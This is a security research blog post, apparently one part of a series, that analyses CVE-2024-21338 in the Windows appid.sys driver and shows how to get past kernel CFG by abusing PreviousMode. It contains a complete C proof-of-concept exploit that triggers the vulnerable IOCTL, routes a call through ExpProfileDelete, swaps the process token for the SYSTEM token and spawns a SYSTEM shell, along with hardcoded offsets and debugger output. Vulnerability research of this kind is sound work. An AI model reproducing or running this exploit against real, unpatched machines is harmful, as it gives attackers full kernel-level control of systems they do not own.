---
title: "[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (En)"
author: L0ch
tags: [L0ch, windows, kernel, mitigation, previousmode, smep, kcfg, dep, bypass, exploit techniques, cve-2024-21338, sedebugprivilege, ioring]
categories: [Research]
date: 2025-01-12 19:00:00
cc: false
index_img: 2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image.png
---

[Bypassing Windows Kernel Mitigations: Part1 - Overview](https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/en/)

Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 ← Now

---

After last month's Part 1 introducing Windows Kernel Mitigation, we're back with Part 2, and this time it's time to dive into kCFG bypassing. We'll analyze the Local Privilege Escalation vulnerability CVE-2024-21338 in appid.sys, which was patched in February 2024, and introduce three post-exploitation techniques to bypass kCFG.

## CVE-2024-21338 - appid.sys Untrusted Pointer Dereference

> Vulnerability analysis and exploitation was performed on Windows 23H2 build 22631.2861 (December 2023 Cumulative Update applied).
> 

The CVE-2024-21338 vulnerability itself is simple! 

![image.png](en/image%201.png)

When the appid.sys driver processes an I/O request from user mode, it calls the `AipSmartHashImageFile` function with a user mode buffer (SystemBuffer) if the IOCTL Code is `0x22A018`.

![image.png](en/image%202.png)

Called in the following order: `AipSmartHashImageFile` - `AppHashComputeFileHashesInternal` - `AppHashComputeImageHashInternal`. In the `AppHashComputeImageHashInternal` function, call a pointer at offset `SystemBuffer+0x16.` 

![image.png](en/image%203.png)

By calling the user-mode controllable SystemBuffer in kernel context, the user will be able to call arbitrary callback pointers in kernel mode (red box). We can even control the address that references the first argument, rcx (blue box).

For more analysis and PoC, check out the reference links below!

- [https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp](https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp)
- [https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/](https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/)

Now we can call any function we want, but can't take advantage of any shellcode or ROP gadgets configured in user mode due to the existence of the mitgation below. 

- SMEP that prevents the CPU from executing userland (ring 3) code while in Supervisor Mode (ring 0) privileged state.
- kCFG that throws an exception and raises `KERNEL_SECURITY_CHECK_FAILURE` if the kernel address is not registered in the bitmap

Even if the SMEP is bypassed by calling the address of the bypass gadget, it will still get stuck in kCFG because it is user-mode code.

Kernel exploits aimed at privilege escalation via token swapping require read and write access to kernel memory. To achieve this, three exploit techniques can establish Full Arbitrary Kernel Read/Write primitives by calling kernel functions that satisfy with kCFG.

1. PreviousMode
2. SeDebugPrigvileges
3. I/O Ring Buffer

~~In this part, I will introduce the above three techniques~~ Due to lack of time, I will only introduce the exploit using PreviousMode in this part... and will cover the exploit using SeDebugPrivileges and I/O Ring Buffer in the next part!

![image.png](en/image%204.png)

## EXP 1 - PreviousMode

The first is via the PreviousMode modification.

[PreviousMode](https://learn.microsoft.com/ko-kr/windows-hardware/drivers/kernel/previousmode) is a KTHREAD structure field that is a flag value that indicates that the thread's parameters came from a user-mode process if the user-mode application called a native system service routine in either the **Nt** or **Zw** version. A PreviousMode value of 1 indicates that the current thread object was created by a call from user-mode, and a value of 0 indicates that it was created from kernel-mode. This serves to restrict kernel access to objects from user-mode.

PreviousMode is a field in the KTHREAD structure that acts as a flag. It indicates whether the thread's parameters originated from a user-mode process. If a user-mode application calls a native system service routine (either the Nt or Zw version), PreviousMode reflects this.

- A value of 1 means the thread was created by a call from user mode.
- A value of 0 means it was created from kernel mode.

This flag helps restrict kernel access to objects originating from user mode

If we can modify the PrevousMode of a user-mode process to 0, we can call the `NtWriteVirtualMemory` or `ReadProcessMemory` functions to get the kernel memory RW primitives, which we'll demonstrate with a simple example and debugging to help make it easier to understand!

```c
#include <stdio.h>
#include "defines.h"

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;

void GetNtFunction() {...}
PVOID GetObj(PULONGLONG objptr, ULONG pid, HANDLE handle){...}

int main() {
	PVOID KTHREAD = NULL;
	PVOID SYSTEM_EPROCESS = NULL;
	PVOID EPROCESS = NULL;

	ULONG dwbytes = 0;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();
	
	// [1]
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&KTHREAD, pid, hThread);
	printf("[+] Current KTHREAD: %p\n", KTHREAD);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&EPROCESS, pid, hProc);
	printf("[+] Current EPROCESS: %p\n", EPROCESS);

	GetObj(&SYSTEM_EPROCESS, 4, (HANDLE)4);
	printf("[+] System EPROCESS: %p\n", SYSTEM_EPROCESS);

	printf("modify previousmode in windbg and press any button..\n");
	getch();

	// [2]
	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + 0x4b8 , (ULONGLONG)SYSTEM_EPROCESS + 0x4b8, sizeof(ULONGLONG), &dwbytes);

	// [3]
	system("cmd.exe");
	
}
```

> [https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c](https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c)
> 

The above code works as follows

1. Leak the required address via the `NtQuerySystemInformation` API
2. Overwrite the token value of the user-mode process to the system process
3. Spawn a cmd with system privileges

In normal execution, nothing happens because the user-mode process cannot RW the kernel memory via `pNtWriteVirtualMemory`...but we will now modify PreviouMode in the debugger before calling `pNtWriteVirtualMemory` and do the privilege escalation.

![image.png](en/image%205.png)

When we run it, it will output the KTHREAD/EPROCESS address of the current process and the EPROCESS address of the SYSTEM process. Copy these and go to windbg.

```c
2: kd> dt _KTHREAD FFFFDC0FC3780080
nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x8ad5b1e
   +0x028 InitialStack     : 0xfffff500`166f7c30 Void
   +0x030 StackLimit       : 0xfffff500`166f1000 Void
   +0x038 StackBase        : 0xfffff500`166f8000 Void
   +0x040 ThreadLock       : 0
   +0x048 CycleTime        : 0x4bf645c
   +0x050 CurrentRunTime   : 0
   +0x054 ExpectedRunTime  : 0xbe0b
   +0x058 KernelStack      : 0xfffff500`166f7000 Void
   +0x060 StateSaveArea    : 0xfffff500`166f7c80 _XSAVE_FORMAT
...
   +0x220 Process          : 0xffffdc0f`c39640c0 _KPROCESS
   +0x228 UserAffinity     : 0xffffdc0f`c3780a68 _KAFFINITY_EX
   +0x230 UserAffinityPrimaryGroup : 0
   +0x232 PreviousMode     : 1 ''
   +0x233 BasePriority     : 8 ''
```

![image.png](en/image%206.png)

We can see that PreviouMode is located at `KTHREAD+0x232`. Since the current process is in user mode, we can see that the PreviouMode is 1. Now, in the Memory window of windbg, modify that value to 0.

![image.png](en/image%207.png)

```c
2: kd> dt _KTHREAD FFFFDC0FC3780080
nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x8ad5b1e
   +0x028 InitialStack     : 0xfffff500`166f7c30 Void
   +0x030 StackLimit       : 0xfffff500`166f1000 Void
   +0x038 StackBase        : 0xfffff500`166f8000 Void
   +0x040 ThreadLock       : 0
   +0x048 CycleTime        : 0x4bf645c
   +0x050 CurrentRunTime   : 0
   +0x054 ExpectedRunTime  : 0xbe0b
   +0x058 KernelStack      : 0xfffff500`166f7000 Void
   +0x060 StateSaveArea    : 0xfffff500`166f7c80 _XSAVE_FORMAT
...
   +0x220 Process          : 0xffffdc0f`c39640c0 _KPROCESS
   +0x228 UserAffinity     : 0xffffdc0f`c3780a68 _KAFFINITY_EX
   +0x230 UserAffinityPrimaryGroup : 0
   +0x232 PreviousMode     : 0 ''
   +0x233 BasePriority     : 8 ''
```

Back in the Analytics machine, press any button to proceed to the next step. 

```c
pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + 0x4b8 , (ULONGLONG)SYSTEM_EPROCESS + 0x4b8, sizeof(ULONGLONG), &dwbytes);
system("cmd.exe")
```

Kernel Read/Write is now possible with `pNtWritevirtualMemory` function through PreviousMode modification. After swapping the token with that of the system EPROCESS, executing the cmd process grants NT AUTHORITY\SYSTEM privileges...!

After swapping the token with that of the system EPROCESS, executing the cmd process grants NT AUTHORITY\SYSTEM privileges...!

![image.png](en/image%208.png)

?

![image.png](en/image%209.png)

I got a BSOD.. ??

The problem occurs when we modify PreviousMode to kernel mode and then try to create a process with system privileges. Since the kernel mode PreviousMode is not needed after token swapping, it should be restored to its original value of 1 before creating the cmd process so that the process can be created without crashing.

```c
	char* restoreBuffer = (char*)malloc(sizeof(CHAR));
	*restoreBuffer = 1;
	
	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + 0x232, (PVOID)restoreBuffer, sizeof(CHAR), &dwbytes);
	system("cmd.exe");
```

If we add the code above and try again…

![image.png](en/image%2010.png)

We can modify the PreviousMode to achieve elevated privileges.

Coming back to the kCFG bypass, we can modify the PreviouMode by calling a normal kernel function registered in the kCFG bitmap after triggering the untrusted pointer dereference vulnerability of CVE-2024-21338. But... how do we find this function among the many, many kernel functions :(

One function worth noting is the `ObfDereferenceObjectWithTag` kernel macro. This macro decrements the reference count field of the object address being passed (offset -0x30), so it would be a perfect macro to change PreviousMode from a user-mode value of 1 to a kernel-mode value of 0.

However, there is one limitation to calling `ObfDereferenceObjectWithTag` directly. As we saw earlier in the bug trigger, we can't directly control the value of the first argument, but only indirectly control the value.

![image.png](en/image%203.png)

We need to find another wrapper function that allows us to dereference rcx once and pass the value as an argument to the `ObfDereferenceObjectWithTag` macro so that we can control it directly.

If we look far enough down the cross-reference list of the `ObfDereferenceObjectWithTag` macro, we find the `ExpProfileDelete` function that satisfies that condition.

```lua
void __fastcall ExpProfileDelete(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 48) )
  {
    KeStopProfile(*(_QWORD *)(a1 + 40));
    MmUnmapLockedPages(*(PVOID *)(a1 + 48), *(PMDL *)(a1 + 56));
    MmUnlockPages(*(PMDL *)(a1 + 56));
    ExFreePoolWithTag(*(PVOID *)(a1 + 40), 0);
  }
  if ( *(_QWORD *)a1 )
    ObfDereferenceObjectWithTag(*(PVOID *)a1, 0x66507845u);
}
```

We call it by passing the value referencing the first argument to `ObfDereferenceObjectWithTag`, which gives us direct control over the first argument of the macro. 

![image.png](en/image%2011.png)

First of all, when calling the `ExpProfileDelete` function via CVE-2024-21338 vulnerability, kCFG is bypassed and jumps to the `ExpProfileDelete` address.

> The `ExpProfileDelete` function address can be obtained by calculating the offset from the ntoskrnle.exe base obtained via `NtQuerySystemInformation` in Part 1.
> 

![image.png](en/image%2012.png)

Inside `ExpProfileDelete`, the rcx at the time of the `ObfDereferenceObjectWithTag` macro call comes out as `0x414141414141414141`. We can finally decrement the address we want!

There may be more functions that satisfy our conditions, even if they are not `ExpProfileDelete`. However, the more complex the logic of the function, the more likely it is to crash and execute code other than our intended behavior, so it's probably a good idea to find a relatively simple function to target.

Below is the final proof-of-concept code that modifies PreviousMode and performs Token Swapping with CVE-2024-21338 vulnerability

```c
#include <stdio.h>
#include "defines.h"

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define DEVICE_NAME "\\\\?\\AppID"

// IOCTL 0x22A018
typedef struct {
	PVOID arg1;
	PVOID objptr;
	PVOID cfgptr;
	PVOID unknown;
} INPUT_BUFFER;

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;
_NtDeviceIoControlFile pNtDeviceIoControlFile;

void GetNtFunction() {...}
PVOID GetImageBase(const char* ModuleName) {...}
PVOID GetFILE_OBJECT_Address(){...}
PVOID GetObj(PULONGLONG objptr, ULONG pid, HANDLE handle){...}

int main() {
	PVOID KTHREAD = NULL;
	PVOID SYSTEM_EPROCESS = NULL;
	PVOID EPROCESS = NULL;
	PVOID PreviousMode = NULL;
	PVOID NTOSKRNL_BASE = NULL;

	ULONG dwbytes = 0;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();

	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&KTHREAD, pid, hThread);
	printf("[+] Current KTHREAD: %p\n", KTHREAD);

	PreviousMode = (UINT64)KTHREAD + 0x232;
	printf("[+] PreviousMode address: %p\n", PreviousMode);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&EPROCESS, pid, hProc);
	printf("[+] Current EPROCESS: %p\n", EPROCESS);

	GetObj(&SYSTEM_EPROCESS, 4, (HANDLE)4);
	printf("[+] System EPROCESS: %p\n", SYSTEM_EPROCESS);

	NTOSKRNL_BASE = GetImageBase("ntoskrnl.exe");
	printf("[+] ntoskrnl.exe base address : %p\n", NTOSKRNL_BASE);

	PVOID ExpProfileDelete = (UINT64)NTOSKRNL_BASE + 0xA01FD0; // kcfg bypass gadget
	printf("[+] ExpProfileDelete function address : %p\n", ExpProfileDelete);

	PVOID FILE_OBJECT = GetFILE_OBJECT_Address();

	INPUT_BUFFER buffer = { 0, };
	HANDLE dHandle;
	dHandle = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, 0, NULL);

	buffer.arg1 = (UINT64)PreviousMode + 0x30;		
	buffer.objptr = FILE_OBJECT;					
	buffer.cfgptr = &ExpProfileDelete;				
	buffer.unknown = NULL;							

	IO_STATUS_BLOCK ioStatus;

	if (pNtDeviceIoControlFile(dHandle, NULL, NULL, NULL, &ioStatus, 0x22A018, &buffer, sizeof(buffer), NULL, &dwbytes) != NOERROR) {
		printf("NtDeviceIoControlFile Failed, 0x%x\n", GetLastError());
	}

	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + 0x4b8, (ULONGLONG)SYSTEM_EPROCESS + 0x4b8, sizeof(ULONGLONG), &dwbytes);

	char* restoreBuffer = (char*)malloc(sizeof(CHAR));
	*restoreBuffer = 1;

	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + 0x232, (PVOID)restoreBuffer, sizeof(CHAR), &dwbytes);

	system("cmd.exe");

	return 0;
}
```

> [https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c](https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c)
> 

![image.png](en/image%2013.png)

I originally planned to introduce all three techniques in this part. It ended up being longer than I thought, so I'll summarize the remaining two techniques in the next part... (it's okay, I'm off for the holidays)

I'll be back with Part 3 :) Keep up the good work in 2025!